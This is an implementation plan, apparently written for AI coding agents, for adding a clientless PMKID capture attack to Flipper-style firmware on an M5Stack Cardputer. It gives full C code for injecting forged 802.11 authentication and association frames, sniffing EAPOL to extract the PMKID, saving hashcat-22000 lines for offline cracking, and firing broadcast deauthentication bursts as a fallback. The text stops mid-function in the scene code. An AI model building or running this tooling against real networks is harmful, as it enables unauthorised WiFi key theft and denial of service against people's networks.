# PMKID Clientless Capture Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a "PMKID Attack" scene to the WiFi app that captures a crackable WPA/WPA2 PMKID from a chosen AP with no client present (manual Auth+Assoc injection), falling back to deauth-assisted passive capture.

**Architecture:** A new scene `WlanAppScenePmkid` drives a state machine (Associating → Waiting-M1 → Captured, with a Deauth-fallback branch). It injects 802.11 Auth + Association-Request frames built by a new **pure, host-testable** module, captures the AP's EAPOL M1 through the existing promiscuous + `wlan_handshake_parser` pipeline, and writes hashcat-22000 lines via a shared writer extracted from the handshake scene. One HAL change lifts the raw-TX length cap so an Assoc-Request (with RSN IE) fits.

**Tech Stack:** ESP-IDF v5.4.1 (ESP32-S3), Flipper app framework (scene manager + view dispatcher), C. Host unit tests compiled with `gcc` (no libcheck dependency).

## Global Constraints

- Target board: `m5stack_cardputer_adv`. Firmware build: run `build_ci.bat` (Windows cmd; uses `IDF_TOOLS_PATH=C:\Users\stone\.espressif`). Success tail: `Project build complete` and a regenerated `Flipper-cardputer_adv-merged.bin`.
- Output file and format are fixed: append to `/ext/wifi/pmkid.22000`, line format `WPA*01*<pmkid_hex>*<ap_mac_hex>*<sta_mac_hex>*<essid_hex>***\n`.
- New frame-builder code MUST be pure C (only `<stdint.h>`, `<stddef.h>`, `<string.h>`) — no furi/esp includes — so it host-compiles.
- Raw-TX buffer cap after this work: **128 bytes** (was 64). Deauth frames (26 B) must remain unaffected.
- Lifecycle discipline (this port has documented task/promiscuous races, see `BUGFIXES.md`): every scene `on_exit` must disable promiscuous, join+free any spawned thread before freeing shared buffers, and clear all statics regardless of state. The promiscuous callback must guard `if(!pool) return;` and never allocate.
- The PMKID KDE layout the extractor expects (verbatim): key-data length at `eapol_start[97..98]`, key data from `eapol_start[99]`, KDE bytes `DD 14 00 0F AC 04` followed by the 16-byte PMKID. A zeroed PMKID is rejected.
- This directory is not yet a git repo — Task 0 initializes one so the per-task commit checkpoints work.

---

### Task 0: Initialize git repository

**Files:**
- Create: `.git/` (via `git init`)

- [ ] **Step 1: Initialize and make the baseline commit**

Run (from project root `Flipper-Zero-meets-M5Stack-Cardputer-1.15/`):

```bash
git init
git add -A
git commit -m "chore: baseline before PMKID clientless capture feature"
```

Expected: a commit is created listing the existing tree. (A `.gitignore` already exists; large binaries like `sdcard.zip`/`*.bin` may be committed — acceptable for a local working repo. If you prefer, add `*.bin`, `sdcard.zip`, `build_cardputer_adv/` to `.gitignore` before committing.)

---

### Task 1: PMKID frame builders + PMKID-extractor host tests (pure logic, TDD)

**Files:**
- Create: `applications/main/wlan_app/pmkid_frames.h`
- Create: `applications/main/wlan_app/pmkid_frames.c`
- Test: `tests/test_pmkid_frames.c`

**Interfaces:**
- Consumes: nothing (pure). For the extractor test, links the existing pure file `applications/main/wlan_app/wlan_handshake_parser.c` and its `bool wlan_hs_extract_pmkid(const uint8_t* eapol_start, int eapol_len, uint8_t pmkid_out[16]);`
- Produces (used by Task 5):
  - `size_t pmkid_build_auth_open(uint8_t* out, size_t cap, const uint8_t bssid[6], const uint8_t src[6]);` — returns bytes written, or 0 if `cap` too small.
  - `size_t pmkid_build_assoc_req(uint8_t* out, size_t cap, const uint8_t bssid[6], const uint8_t src[6], const char* ssid);` — returns bytes written, or 0 if `cap` too small. (Channel is NOT in the body; set on the radio separately.)

- [ ] **Step 1: Write the header**

Create `applications/main/wlan_app/pmkid_frames.h`:

```c
#pragma once

#include <stdint.h>
#include <stddef.h>

/* Build an 802.11 open-system Authentication frame (seq 1) addressed to `bssid`
 * from `src`. Returns total length written to `out`, or 0 if `cap` is too small.
 * Layout: 24-byte MAC header + 6-byte auth body = 30 bytes. */
size_t pmkid_build_auth_open(uint8_t* out, size_t cap, const uint8_t bssid[6], const uint8_t src[6]);

/* Build an 802.11 Association Request to `bssid` from `src`, advertising an RSN
 * IE (CCMP group + pairwise, PSK AKM) so the AP returns an RSN PMKID in EAPOL
 * M1. `ssid` is the target's SSID (<=32 chars). Returns total length written, or
 * 0 if `cap` is too small. Max length with a 32-char SSID is 94 bytes. */
size_t pmkid_build_assoc_req(uint8_t* out, size_t cap, const uint8_t bssid[6], const uint8_t src[6], const char* ssid);
```

- [ ] **Step 2: Write the failing test**

Create `tests/test_pmkid_frames.c`:

```c
/* Host test — compile with gcc, no libcheck. Pure-logic coverage of the PMKID
 * frame builders and the existing EAPOL PMKID extractor. */
#include <assert.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>

#include "../applications/main/wlan_app/pmkid_frames.h"
#include "../applications/main/wlan_app/wlan_handshake_parser.h"

static const uint8_t BSSID[6] = {0xAA, 0xBB, 0xCC, 0x11, 0x22, 0x33};
static const uint8_t SRC[6]   = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01};

static void test_auth_open(void) {
    uint8_t f[64];
    size_t n = pmkid_build_auth_open(f, sizeof(f), BSSID, SRC);
    assert(n == 30);
    assert(f[0] == 0xB0 && f[1] == 0x00);            /* mgmt, subtype Authentication */
    assert(memcmp(&f[4], BSSID, 6) == 0);            /* addr1 = BSSID */
    assert(memcmp(&f[10], SRC, 6) == 0);             /* addr2 = SRC */
    assert(memcmp(&f[16], BSSID, 6) == 0);           /* addr3 = BSSID */
    assert(f[24] == 0x00 && f[25] == 0x00);          /* auth algo = open */
    assert(f[26] == 0x01 && f[27] == 0x00);          /* auth seq = 1 */
    assert(f[28] == 0x00 && f[29] == 0x00);          /* status = 0 */
    printf("test_auth_open OK (%zu bytes)\n", n);
}

static void test_auth_open_cap_overflow(void) {
    uint8_t f[8];
    assert(pmkid_build_auth_open(f, sizeof(f), BSSID, SRC) == 0);
    printf("test_auth_open_cap_overflow OK\n");
}

static void test_assoc_req(void) {
    uint8_t f[128];
    const char* ssid = "TestNet";
    size_t n = pmkid_build_assoc_req(f, sizeof(f), BSSID, SRC, ssid);
    /* 24 hdr + 4 (cap+listen) + (2+7 ssid) + (2+8 rates) + (2+20 rsn) = 69 */
    assert(n == 69);
    assert(n <= 128);
    assert(f[0] == 0x00 && f[1] == 0x00);            /* mgmt, subtype Assoc Req */
    assert(memcmp(&f[4], BSSID, 6) == 0);
    assert(memcmp(&f[10], SRC, 6) == 0);
    /* capability info + listen interval */
    assert(f[24] == 0x11 && f[25] == 0x00);          /* ESS + Privacy */
    assert(f[26] == 0x0A && f[27] == 0x00);          /* listen interval */
    /* SSID tag */
    assert(f[28] == 0x00 && f[29] == 0x07);
    assert(memcmp(&f[30], "TestNet", 7) == 0);
    /* Supported rates tag right after SSID */
    assert(f[37] == 0x01 && f[38] == 0x08);
    /* RSN IE: find it after rates (offset 47) */
    size_t rsn = 47;
    assert(f[rsn] == 0x30 && f[rsn + 1] == 0x14);    /* RSN IE, len 20 */
    assert(f[rsn + 2] == 0x01 && f[rsn + 3] == 0x00);/* version 1 */
    assert(f[rsn + 4] == 0x00 && f[rsn + 5] == 0x0F && f[rsn + 6] == 0xAC && f[rsn + 7] == 0x04); /* group CCMP */
    assert(f[rsn + 8] == 0x01 && f[rsn + 9] == 0x00);/* pairwise count 1 */
    assert(f[rsn + 10] == 0x00 && f[rsn + 11] == 0x0F && f[rsn + 12] == 0xAC && f[rsn + 13] == 0x04); /* pairwise CCMP */
    assert(f[rsn + 14] == 0x01 && f[rsn + 15] == 0x00); /* akm count 1 */
    assert(f[rsn + 16] == 0x00 && f[rsn + 17] == 0x0F && f[rsn + 18] == 0xAC && f[rsn + 19] == 0x02); /* akm PSK */
    assert(f[rsn + 20] == 0x00 && f[rsn + 21] == 0x00); /* RSN caps */
    printf("test_assoc_req OK (%zu bytes)\n", n);
}

static void test_assoc_req_cap_overflow(void) {
    uint8_t f[32];
    assert(pmkid_build_assoc_req(f, sizeof(f), BSSID, SRC, "TestNet") == 0);
    printf("test_assoc_req_cap_overflow OK\n");
}

static void test_extract_pmkid(void) {
    /* Build a minimal EAPOL body: key-data length at [97..98]=22, KDE at [99]. */
    uint8_t eapol[121];
    memset(eapol, 0, sizeof(eapol));
    eapol[97] = 0x00;
    eapol[98] = 0x16;                                /* key data len = 22 */
    uint8_t kde[] = {0xDD, 0x14, 0x00, 0x0F, 0xAC, 0x04};
    memcpy(&eapol[99], kde, sizeof(kde));
    for(int i = 0; i < 16; i++) eapol[105 + i] = (uint8_t)(0x40 + i); /* non-zero PMKID */

    uint8_t out[16];
    assert(wlan_hs_extract_pmkid(eapol, (int)sizeof(eapol), out) == true);
    for(int i = 0; i < 16; i++) assert(out[i] == (uint8_t)(0x40 + i));
    printf("test_extract_pmkid OK\n");
}

static void test_extract_pmkid_zeroed_rejected(void) {
    uint8_t eapol[121];
    memset(eapol, 0, sizeof(eapol));
    eapol[98] = 0x16;
    uint8_t kde[] = {0xDD, 0x14, 0x00, 0x0F, 0xAC, 0x04};
    memcpy(&eapol[99], kde, sizeof(kde));            /* PMKID left all-zero */
    uint8_t out[16];
    assert(wlan_hs_extract_pmkid(eapol, (int)sizeof(eapol), out) == false);
    printf("test_extract_pmkid_zeroed_rejected OK\n");
}

int main(void) {
    test_auth_open();
    test_auth_open_cap_overflow();
    test_assoc_req();
    test_assoc_req_cap_overflow();
    test_extract_pmkid();
    test_extract_pmkid_zeroed_rejected();
    printf("ALL PMKID FRAME TESTS PASSED\n");
    return 0;
}
```

- [ ] **Step 3: Run the test to verify it fails (builders not implemented)**

Run (Git Bash, from project root):

```bash
gcc -Wall -o tests/test_pmkid_frames \
  tests/test_pmkid_frames.c \
  applications/main/wlan_app/pmkid_frames.c \
  applications/main/wlan_app/wlan_handshake_parser.c
```

Expected: **compile/link FAILS** — `pmkid_frames.c` does not exist yet (or undefined references to the two builder functions).

- [ ] **Step 4: Implement the builders**

Create `applications/main/wlan_app/pmkid_frames.c`:

```c
#include "pmkid_frames.h"
#include <string.h>

/* 8 default supported rates: 1, 2, 5.5, 11, 18, 24, 36, 54 Mbit/s. */
static const uint8_t kRates[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};

/* RSN IE payload (after tag id 0x30 + length 0x14): version, group cipher CCMP,
 * 1 pairwise CCMP, 1 AKM PSK, RSN capabilities 0x0000. */
static const uint8_t kRsn[20] = {
    0x01, 0x00,                   /* version */
    0x00, 0x0F, 0xAC, 0x04,       /* group cipher: CCMP */
    0x01, 0x00,                   /* pairwise count */
    0x00, 0x0F, 0xAC, 0x04,       /* pairwise: CCMP */
    0x01, 0x00,                   /* AKM count */
    0x00, 0x0F, 0xAC, 0x02,       /* AKM: PSK */
    0x00, 0x00,                   /* RSN capabilities */
};

size_t pmkid_build_auth_open(uint8_t* out, size_t cap, const uint8_t bssid[6], const uint8_t src[6]) {
    if(cap < 30) return 0;
    size_t i = 0;
    out[i++] = 0xB0;              /* frame control: mgmt, subtype Authentication */
    out[i++] = 0x00;
    out[i++] = 0x00;             /* duration */
    out[i++] = 0x00;
    memcpy(&out[i], bssid, 6); i += 6;   /* addr1 = BSSID */
    memcpy(&out[i], src, 6);   i += 6;   /* addr2 = SA */
    memcpy(&out[i], bssid, 6); i += 6;   /* addr3 = BSSID */
    out[i++] = 0x00;             /* seq control */
    out[i++] = 0x00;
    out[i++] = 0x00;             /* auth algorithm: open system */
    out[i++] = 0x00;
    out[i++] = 0x01;             /* auth transaction seq = 1 */
    out[i++] = 0x00;
    out[i++] = 0x00;             /* status code = 0 */
    out[i++] = 0x00;
    return i;                    /* 30 */
}

size_t pmkid_build_assoc_req(uint8_t* out, size_t cap, const uint8_t bssid[6], const uint8_t src[6], const char* ssid) {
    size_t ssid_len = ssid ? strnlen(ssid, 32) : 0;
    size_t total = 24 + 4 + (2 + ssid_len) + (2 + sizeof(kRates)) + (2 + sizeof(kRsn));
    if(cap < total) return 0;

    size_t i = 0;
    out[i++] = 0x00;             /* frame control: mgmt, subtype Assoc Request */
    out[i++] = 0x00;
    out[i++] = 0x00;             /* duration */
    out[i++] = 0x00;
    memcpy(&out[i], bssid, 6); i += 6;   /* addr1 = BSSID */
    memcpy(&out[i], src, 6);   i += 6;   /* addr2 = SA */
    memcpy(&out[i], bssid, 6); i += 6;   /* addr3 = BSSID */
    out[i++] = 0x00;             /* seq control */
    out[i++] = 0x00;
    /* fixed params */
    out[i++] = 0x11;             /* capability info: ESS + Privacy */
    out[i++] = 0x00;
    out[i++] = 0x0A;             /* listen interval */
    out[i++] = 0x00;
    /* SSID tag */
    out[i++] = 0x00;
    out[i++] = (uint8_t)ssid_len;
    if(ssid_len) { memcpy(&out[i], ssid, ssid_len); i += ssid_len; }
    /* Supported rates tag */
    out[i++] = 0x01;
    out[i++] = (uint8_t)sizeof(kRates);
    memcpy(&out[i], kRates, sizeof(kRates)); i += sizeof(kRates);
    /* RSN IE */
    out[i++] = 0x30;
    out[i++] = (uint8_t)sizeof(kRsn);
    memcpy(&out[i], kRsn, sizeof(kRsn)); i += sizeof(kRsn);
    return i;
}
```

- [ ] **Step 5: Run the test to verify it passes**

```bash
gcc -Wall -o tests/test_pmkid_frames \
  tests/test_pmkid_frames.c \
  applications/main/wlan_app/pmkid_frames.c \
  applications/main/wlan_app/wlan_handshake_parser.c
./tests/test_pmkid_frames
```

Expected: prints each `... OK` line then `ALL PMKID FRAME TESTS PASSED`, exit 0.

- [ ] **Step 6: Commit**

```bash
git add applications/main/wlan_app/pmkid_frames.h applications/main/wlan_app/pmkid_frames.c tests/test_pmkid_frames.c
git commit -m "feat(wlan): add host-tested PMKID auth/assoc frame builders"
```

---

### Task 2: Lift the raw-TX length cap (64 → 128) in the WiFi HAL

**Files:**
- Modify: `applications/main/wlan_app/wlan_hal.c` (the `send_raw` command struct field ~line 67, and `wlan_hal_send_raw()` ~line 506)

**Interfaces:**
- Produces (used by Task 5): `wlan_hal_send_raw()` now accepts frames up to 128 bytes; the queued command buffer is 128 bytes wide.

- [ ] **Step 1: Widen the command buffer**

In `applications/main/wlan_app/wlan_hal.c`, find the `send_raw` command field (the struct member around line 67 inside the `WlanCmd` union):

```c
        struct {
            uint8_t buf[64];
            uint16_t len;
        } send_raw;
```

Change the buffer size to 128:

```c
        struct {
            uint8_t buf[128];
            uint16_t len;
        } send_raw;
```

- [ ] **Step 2: Raise the reject threshold**

In the same file, find `wlan_hal_send_raw()` (~line 506):

```c
bool wlan_hal_send_raw(const uint8_t* data, uint16_t len) {
    if(!s_started || !s_cmd_queue || len > 64) return false;
```

Change `len > 64` to `len > 128`:

```c
bool wlan_hal_send_raw(const uint8_t* data, uint16_t len) {
    if(!s_started || !s_cmd_queue || len > 128) return false;
```

- [ ] **Step 3: Build to verify it compiles**

Run (Windows cmd, from project root):

```
build_ci.bat
```

Expected tail: `Project build complete` and a regenerated `Flipper-cardputer_adv-merged.bin`. (Deauth still sends 26-byte frames — unaffected.)

- [ ] **Step 4: Commit**

```bash
git add applications/main/wlan_app/wlan_hal.c
git commit -m "feat(wlan): raise raw 802.11 TX cap 64->128 for assoc-req injection"
```

---

### Task 3: Extract the shared hashcat-22000 PMKID writer

**Files:**
- Create: `applications/main/wlan_app/wlan_pmkid_out.h`
- Create: `applications/main/wlan_app/wlan_pmkid_out.c`
- Modify: `applications/main/wlan_app/scenes/scene_handshake.c` (remove the local `hs_save_pmkid`, call the shared one; lines ~157-180 and call site ~388)

**Interfaces:**
- Produces (used by Task 5 and by the refactored handshake scene):
  - `void wlan_pmkid_save(struct Storage* storage, const uint8_t pmkid[16], const uint8_t ap[6], const uint8_t sta[6], const char* ssid);`
  - Appends one hashcat-22000 line to `/ext/wifi/pmkid.22000` (creates `/ext/wifi` if missing). Behavior identical to the old `hs_save_pmkid`.

- [ ] **Step 1: Write the header**

Create `applications/main/wlan_app/wlan_pmkid_out.h`:

```c
#pragma once

#include <stdint.h>

typedef struct Storage Storage;

/* Append a captured PMKID to /ext/wifi/pmkid.22000 in hashcat -m 22000 format:
 * WPA*01*<pmkid>*<ap_mac>*<sta_mac>*<essid_hex>*** — clientless, crackable
 * offline. No-op if storage is NULL. */
void wlan_pmkid_save(
    Storage* storage,
    const uint8_t pmkid[16],
    const uint8_t ap[6],
    const uint8_t sta[6],
    const char* ssid);
```

- [ ] **Step 2: Write the implementation (moved verbatim from scene_handshake.c)**

Create `applications/main/wlan_app/wlan_pmkid_out.c`:

```c
#include "wlan_pmkid_out.h"
#include <storage/storage.h>
#include <stdio.h>

void wlan_pmkid_save(
    Storage* storage,
    const uint8_t pmkid[16],
    const uint8_t ap[6],
    const uint8_t sta[6],
    const char* ssid) {
    if(!storage) return;
    storage_common_mkdir(storage, "/ext/wifi");
    File* f = storage_file_alloc(storage);
    if(storage_file_open(f, "/ext/wifi/pmkid.22000", FSAM_WRITE, FSOM_OPEN_APPEND)) {
        char line[160];
        int n = snprintf(line, sizeof(line), "WPA*01*");
        for(int i = 0; i < 16; i++) n += snprintf(line + n, sizeof(line) - n, "%02x", pmkid[i]);
        n += snprintf(line + n, sizeof(line) - n, "*");
        for(int i = 0; i < 6; i++) n += snprintf(line + n, sizeof(line) - n, "%02x", ap[i]);
        n += snprintf(line + n, sizeof(line) - n, "*");
        for(int i = 0; i < 6; i++) n += snprintf(line + n, sizeof(line) - n, "%02x", sta[i]);
        n += snprintf(line + n, sizeof(line) - n, "*");
        for(const char* p = ssid; *p && n < (int)sizeof(line) - 8; p++)
            n += snprintf(line + n, sizeof(line) - n, "%02x", (uint8_t)*p);
        n += snprintf(line + n, sizeof(line) - n, "***\n");
        storage_file_write(f, line, n);
        storage_file_close(f);
    }
    storage_file_free(f);
}
```

- [ ] **Step 3: Refactor scene_handshake.c to use the shared writer**

In `applications/main/wlan_app/scenes/scene_handshake.c`:

1. Add the include near the other includes at the top (after `#include "../wlan_handshake_parser.h"`):

```c
#include "../wlan_pmkid_out.h"
```

2. Delete the entire local `hs_save_pmkid` function (the block from the comment `/* Append a captured PMKID ... */` through its closing brace, roughly lines 157-180).

3. Update the single call site (in `hs_process_packet_single`, ~line 388) from:

```c
                hs_save_pmkid(pmkid, s_single.bssid, station, s_single.ssid);
```

to:

```c
                wlan_pmkid_save(s_storage, pmkid, s_single.bssid, station, s_single.ssid);
```

(`s_storage` is the file-static `Storage*` already opened in `hs_init_single`.)

- [ ] **Step 4: Build to verify no behavior change**

Run (Windows cmd):

```
build_ci.bat
```

Expected: `Project build complete`. The handshake scene still writes PMKIDs; only the writer's location moved.

- [ ] **Step 5: Commit**

```bash
git add applications/main/wlan_app/wlan_pmkid_out.h applications/main/wlan_app/wlan_pmkid_out.c applications/main/wlan_app/scenes/scene_handshake.c
git commit -m "refactor(wlan): extract shared hashcat-22000 PMKID writer"
```

---

### Task 4: PMKID status view + registration

**Files:**
- Create: `applications/main/wlan_app/views/wlan_pmkid_view.h`
- Create: `applications/main/wlan_app/views/wlan_pmkid_view.c`
- Modify: `applications/main/wlan_app/wlan_app.h` (add `WlanAppViewPmkid` to the `WlanAppView` enum ~line 56; add a `View* view_pmkid;` field to the `WlanApp` struct)
- Modify: `applications/main/wlan_app/wlan_app.c` (alloc + add + free the view, mirroring `view_handshake` at lines ~82-84)

**Interfaces:**
- Produces (used by Task 5):
  - `typedef enum { PmkidStateAssociating, PmkidStateWaiting, PmkidStateFallback, PmkidStateCaptured } PmkidState;`
  - `typedef struct { char ssid[33]; uint8_t bssid[6]; uint8_t channel; PmkidState state; uint32_t attempts; bool have_pmkid; char pmkid_hex[33]; } WlanPmkidViewModel;`
  - `View* wlan_pmkid_view_alloc(void);`
  - `void wlan_pmkid_view_free(View* view);`
  - `View* wlan_pmkid_view_get_view(View* view);` — returns the same `View*` (kept for call-site symmetry with other views that wrap a struct). Here `wlan_pmkid_view_alloc` returns the `View*` directly, so Task 5 uses `app->view_pmkid` with `view_get_model`/`view_commit_model`.

- [ ] **Step 1: Write the view header**

Create `applications/main/wlan_app/views/wlan_pmkid_view.h`:

```c
#pragma once

#include <gui/view.h>
#include <stdint.h>
#include <stdbool.h>

typedef enum {
    PmkidStateAssociating,
    PmkidStateWaiting,
    PmkidStateFallback,
    PmkidStateCaptured,
} PmkidState;

typedef struct {
    char ssid[33];
    uint8_t bssid[6];
    uint8_t channel;
    PmkidState state;
    uint32_t attempts;
    bool have_pmkid;
    char pmkid_hex[33]; /* 16 bytes -> 32 hex chars + NUL */
} WlanPmkidViewModel;

View* wlan_pmkid_view_alloc(void);
void wlan_pmkid_view_free(View* view);
```

- [ ] **Step 2: Write the view implementation**

Create `applications/main/wlan_app/views/wlan_pmkid_view.c`:

```c
#include "wlan_pmkid_view.h"
#include <gui/elements.h>
#include <furi.h>
#include <stdio.h>

static const char* pmkid_state_str(PmkidState s) {
    switch(s) {
    case PmkidStateAssociating: return "Associating...";
    case PmkidStateWaiting:     return "Waiting for M1...";
    case PmkidStateFallback:    return "Deauth fallback...";
    case PmkidStateCaptured:    return "PMKID CAPTURED!";
    default:                    return "?";
    }
}

static void wlan_pmkid_view_draw(Canvas* canvas, void* model) {
    WlanPmkidViewModel* m = model;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 10, "PMKID Attack");

    canvas_set_font(canvas, FontSecondary);
    char line[64];
    snprintf(line, sizeof(line), "SSID: %.20s", m->ssid[0] ? m->ssid : "(hidden)");
    canvas_draw_str(canvas, 2, 24, line);
    snprintf(line, sizeof(line), "CH %u  tries %lu", (unsigned)m->channel, (unsigned long)m->attempts);
    canvas_draw_str(canvas, 2, 36, line);
    canvas_draw_str(canvas, 2, 48, pmkid_state_str(m->state));

    if(m->have_pmkid) {
        snprintf(line, sizeof(line), "%.16s..", m->pmkid_hex);
        canvas_draw_str(canvas, 2, 60, line);
    } else {
        elements_button_left(canvas, "Back");
    }
}

static bool wlan_pmkid_view_input(InputEvent* event, void* context) {
    UNUSED(event);
    UNUSED(context);
    return false; /* scene handles navigation via the dispatcher back-handler */
}

View* wlan_pmkid_view_alloc(void) {
    View* view = view_alloc();
    view_allocate_model(view, ViewModelTypeLocking, sizeof(WlanPmkidViewModel));
    view_set_draw_callback(view, wlan_pmkid_view_draw);
    view_set_input_callback(view, wlan_pmkid_view_input);
    return view;
}

void wlan_pmkid_view_free(View* view) {
    view_free(view);
}
```

- [ ] **Step 3: Register the view enum + field in wlan_app.h**

In `applications/main/wlan_app/wlan_app.h`, add to the `WlanAppView` enum (after `WlanAppViewSdUpdate,`):

```c
    WlanAppViewPmkid,
```

And add to the `WlanApp` struct, near the other `View*` view members (e.g. after `View* view_handshake;`):

```c
    View* view_pmkid;
```

- [ ] **Step 4: Alloc/add/free the view in wlan_app.c**

In `applications/main/wlan_app/wlan_app.c`, add the include at the top with the other view includes:

```c
#include "views/wlan_pmkid_view.h"
```

After the `view_handshake` registration block (~line 84), add:

```c
    app->view_pmkid = wlan_pmkid_view_alloc();
    view_dispatcher_add_view(app->view_dispatcher, WlanAppViewPmkid, app->view_pmkid);
```

In the app's free/teardown function (where the other views are removed/freed — search for `view_dispatcher_remove_view(app->view_dispatcher, WlanAppViewHandshake)` and the matching free), add alongside them:

```c
    view_dispatcher_remove_view(app->view_dispatcher, WlanAppViewPmkid);
    wlan_pmkid_view_free(app->view_pmkid);
```

- [ ] **Step 5: Build to verify it compiles + registers**

Run (Windows cmd):

```
build_ci.bat
```

Expected: `Project build complete`.

- [ ] **Step 6: Commit**

```bash
git add applications/main/wlan_app/views/wlan_pmkid_view.h applications/main/wlan_app/views/wlan_pmkid_view.c applications/main/wlan_app/wlan_app.h applications/main/wlan_app/wlan_app.c
git commit -m "feat(wlan): add PMKID attack status view"
```

---

### Task 5: PMKID attack scene (state machine + injection + capture + fallback)

**Files:**
- Create: `applications/main/wlan_app/scenes/scene_pmkid.c`
- Modify: `applications/main/wlan_app/scenes/scene_config.h` (add the scene registration line)

**Interfaces:**
- Consumes: `pmkid_build_auth_open`, `pmkid_build_assoc_req` (Task 1); `wlan_hal_send_raw` @128 (Task 2); `wlan_pmkid_save` (Task 3); `WlanPmkidViewModel`/`PmkidState`/`app->view_pmkid`/`WlanAppViewPmkid` (Task 4); existing `wlan_hal_*`, `wlan_handshake_parser` helpers, and `app->target_ap`/`app->connected_ap`/`app->connected`.
- Produces: scene functions `wlan_app_scene_pmkid_on_enter/on_event/on_exit` (generated names via the X-macro), reachable at `WlanAppScenePmkid`.

- [ ] **Step 1: Register the scene**

In `applications/main/wlan_app/scenes/scene_config.h`, add after the `handshake` scenes (order is not critical, but keep it near the other attack scenes):

```c
ADD_SCENE(wlan_app, pmkid, Pmkid)
```

- [ ] **Step 2: Write the scene**

Create `applications/main/wlan_app/scenes/scene_pmkid.c`:

```c
#include "../wlan_app.h"
#include "../wlan_hal.h"
#include "../wlan_handshake_parser.h"
#include "../wlan_pmkid_out.h"
#include "../pmkid_frames.h"
#include "../views/wlan_pmkid_view.h"
#include <esp_timer.h>
#include <storage/storage.h>
#include <string.h>

#define TAG "WlanPmkid"

/* Timing (driven from the scene-manager Tick handler — no furi_delay_ms here). */
#define PMK_ASSOC_RETRY_MS   800
#define PMK_FALLBACK_AFTER_MS 9000
#define PMK_MAX_ATTEMPTS     10

/* Deauth burst (fallback), same template as the handshake scene. */
static const uint8_t pmk_deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00,
};

/* Small dedicated ring buffer (do NOT share the handshake scene's statics). */
#define PMK_POOL_SIZE 24
#define PMK_PKT_MAX   512
typedef struct {
    uint16_t len;
    uint8_t data[PMK_PKT_MAX];
} PmkPkt;

static PmkPkt* s_pool = NULL;
static volatile uint32_t s_w = 0;
static volatile uint32_t s_r = 0;

static uint8_t s_bssid[6];
static uint8_t s_own_mac[6];
static char s_ssid[33];
static uint8_t s_channel;
static Storage* s_storage = NULL;

static PmkidState s_state;
static uint32_t s_attempts;
static uint32_t s_state_since_ms;
static bool s_have_pmkid;
static uint8_t s_pmkid[16];

static uint32_t now_ms(void) {
    return (uint32_t)(esp_timer_get_time() / 1000);
}

static const WlanApRecord* pmk_pick_target(const WlanApp* app) {
    if(app->target_ap.ssid[0]) return &app->target_ap;
    if(app->connected) return &app->connected_ap;
    return NULL;
}

/* Promiscuous RX: keep only EAPOL data frames whose BSSID matches the target.
 * Guard the NULL pool (RX task can fire after free / before alloc). */
static void pmk_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    UNUSED(type);
    if(!s_pool) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if(len < 24 || len > PMK_PKT_MAX) return;

    uint16_t fc = payload[0] | (payload[1] << 8);
    if(((fc & 0x0C) >> 2) != 2) return; /* data frames only */
    int hdr_len = 24;
    uint8_t to_ds = (fc & 0x0100) >> 8;
    uint8_t from_ds = (fc & 0x0200) >> 9;
    if(to_ds && from_ds) hdr_len = 30;
    uint8_t subtype = (fc & 0xF0) >> 4;
    if((subtype & 0x08) == 0x08) hdr_len += 2;
    if(len < hdr_len + 8) return;
    const uint8_t* llc = &payload[hdr_len];
    if(!(llc[0] == 0xAA && llc[1] == 0xAA && llc[6] == 0x88 && llc[7] == 0x8E)) return;

    uint32_t next = (s_w + 1) % PMK_POOL_SIZE;
    if(next == s_r) return;
    memcpy(s_pool[s_w].data, payload, len);
    s_pool[s_w].len = (uint16_t)len;
    s_w = next;
}

/* Returns true if a fresh, non-zero PMKID for our target was captured+saved. */
static bool pmk_drain(void) {
    bool got = false;
    while(s_r != s_w) {
        PmkPkt* p = &s_pool[s_r];
        const uint8_t* payload = p->data;
        int len = p->len;
        const uint8_t* bssid = NULL;
        const uint8_t* station = NULL;
        const uint8_t* ap = NULL;
        int header_len = 0;
        if(wlan_hs_parse_addresses(payload, len, &bssid, &station, &ap, &header_len) &&
           memcmp(bssid, s_bssid, 6) == 0 && wlan_hs_is_eapol(payload, header_len, len)) {
            const uint8_t* eapol = &payload[header_len + 8];
            int eapol_len = len - header_len - 8;
            if(wlan_hs_get_eapol_msg_num(eapol, eapol_len) == 1 && !s_have_pmkid) {
                uint8_t pmkid[16];
                if(wlan_hs_extract_pmkid(eapol, eapol_len, pmkid)) {
                    memcpy(s_pmkid, pmkid, 16);
                    s_have_pmkid = true;
                    wlan_pmkid_save(s_storage, pmkid, s_bssid, station ? station : s_own_mac, s_ssid);
                    FURI_LOG_I(TAG, "PMKID captured: %s", s_ssid);
                    got = true;
                }
            }
        }
        s_r = (s_r + 1) % PMK_POOL_SIZE;
    }
    return got;
}

static void pmk_inject_assoc(void) {
    uint8_t frame[128];
    size_t n = pmkid_build_auth_open(frame, sizeof(frame), s_bssid, s_own_mac);
    if(n) wlan_hal_send_raw(frame, (uint16_t)n);
    n = pmkid_build_assoc_req(frame, sizeof(frame), s_bssid, s_own_mac, s_ssid);
    if(n) wlan_hal_send_raw(frame, (uint16_t)n);
    s_attempts++;
}

static void pmk_deauth_burst(void) {
    uint8_t f[26];
    memcpy(f, pmk_deauth_tmpl, 26);
    memcpy(&f[10], s_bssid, 6);
    memcpy(&f[16], s_bssid, 6);
    for(int i = 0; i < 8; i++) wlan_hal_send_raw(f, 26);
}

static void pmk_set_state(PmkidState st) {
    s_state = st;
    s_state_since_ms = now_ms();
}

static void pmk_publish(WlanApp* app) {
    WlanPmkidViewModel* m = view_get_model(app->view_pmkid);
    strncpy(m->ssid, s_ssid, sizeof(m->ssid) - 1);
